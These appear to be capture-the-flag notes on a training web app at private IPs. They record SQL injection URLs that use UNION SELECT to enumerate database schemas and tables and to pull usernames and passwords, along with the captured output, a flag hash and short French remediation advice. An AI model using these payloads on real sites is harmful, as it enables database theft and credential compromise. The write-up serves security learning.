http://172.20.10.9/?page=signin&username=&password=&Login=Login#

https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

-------------------------------------------
databases

http://192.168.1.34/index.php
?page=member
&id=-1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
&Submit=Submit#

-------------------------------------------

https://172.20.10.9/index.php?page=member&id=1%20AND%201=1&Submit=Submit#
https://172.20.10.9/index.php?page=member&id=1%20UNION%20ALL%20SELECT%20NULL,concat(schema_name)%20FROM%20information_schema.schemata--&Submit=Submit#

Output: 

ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: Barack Hussein
Surname : Obama
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : information_schema
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_Brute_Force
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_Sql_Injection
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_guestbook
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_images
ID: 1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata-- 
First name: 
Surname : Member_survey

https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections


http://192.168.1.34/index.php
?page=member
&id=-1 union select column_name,0 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
&Submit=Submit 

http://192.168.1.34/index.php
?page=member
&id=1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)--
&Submit=Submit#

--------------------------- user password
http://192.168.1.34/

index.php
?page=member
&id=-1 union select username, password from Member_Brute_Force.db_default
&Submit=Submit

Comment la corriger
Idem flag03 (requêtes préparées + password_hash)
On pourrait aussi imaginer sécuriser la connexion avec un compte administrateur en mettant en place une authentification à deux facteurs (par exemple en demandant un code envoyé par SMS en plus du mot de passe).


THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2ß


## Correction

Bloquer les injections SQL, forcer l'utilisation d'un mot de passe fort et bloquer au bout de 3 tentatives par exemple les connexions (voir fail2ban).